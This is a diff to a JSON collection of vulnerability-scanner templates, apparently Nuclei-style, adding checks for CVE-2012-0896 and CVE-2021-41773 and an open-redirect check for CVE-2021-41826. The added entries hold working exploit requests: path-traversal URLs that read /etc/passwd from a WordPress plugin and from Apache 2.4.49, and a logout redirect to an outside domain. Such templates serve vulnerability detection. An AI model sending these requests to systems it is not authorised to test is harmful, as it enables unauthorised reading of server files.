@@ -5756,6 +5756,43 @@
       ]
     },
     {
+      "id": "CVE-2012-0896",
+      "info": {
+        "author": "daffainfo",
+        "description": "Absolute path traversal vulnerability in download.php in the Count Per Day module before 3.1.1 for WordPress allows remote attackers to read arbitrary files via the f parameter.",
+        "name": "Count Per Day <= 3.1 - download.php f Parameter Traversal Arbitrary File Access",
+        "reference": [
+          "https://packetstormsecurity.com/files/108631/",
+          "https://www.cvedetails.com/cve/CVE-2012-0896"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2012,lfi,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-0901",
       "info": {
         "author": "daffainfo",
@@ -13272,6 +13309,7 @@
               "type": "status"
             },
             {
+              "condition": "and",
               "part": "body",
               "type": "word",
               "words": [
@@ -35985,6 +36023,86 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/homeaction.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41773",
+      "info": {
+        "author": "daffainfo",
+        "description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.",
+        "name": "Apache 2.4.49 - Path Traversal",
+        "reference": [
+          "https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+          "https://twitter.com/ptswarm/status/1445376079548624899",
+          "https://twitter.com/h4x0r_dz/status/1445401960371429381"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,lfi,apache,misconfig"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41826",
+      "info": {
+        "author": "geeknik",
+        "description": "PlaceOS Authentication Service before 1.29.10.0 allows app/controllers/auth/sessions_controller.rb open redirect",
+        "name": "PlaceOS 1.2109.1 - Open Redirection",
+        "reference": [
+          "https://github.com/PlaceOS/auth/issues/36",
+          "https://www.exploit-db.com/exploits/50359",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41826"
+        ],
+        "severity": "low",
+        "tags": "cve,cve2021,placeos,redirect"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "status": [
+                302,
+                301
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "words": [
+                "(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com.*$"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/auth/logout?continue=//example.com"
           ]
         }
       ]
